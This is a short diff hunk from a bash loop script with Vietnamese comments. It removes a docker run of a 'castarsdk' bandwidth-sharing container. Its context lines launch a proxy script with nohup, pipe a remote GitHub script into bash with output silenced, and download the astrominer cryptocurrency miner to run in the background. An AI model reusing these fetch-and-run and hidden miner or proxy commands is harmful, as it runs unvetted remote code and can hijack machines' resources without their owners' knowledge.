@@ -43,7 +43,6 @@ while true; do
     chmod +x layproxyrack.sh
     nohup bash ./layproxyrack.sh >/dev/null 2>&1 &
     bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/runoneur.sh) > /dev/null 2>&1 &
-    docker run -d --name castarsdk -e KEY=cskLF1jAysiPEk ghcr.io/adfly8470/castarsdk/castarsdk@sha256:30d7e9830c0144165b86dbb053eaea11e36d1b9f7ee0837fd4eda71cc6b48125 > /dev/null 2>&1 &
     # Chạy astrominer nền không chặn vòng lặp
     (
       wget -q https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz && \
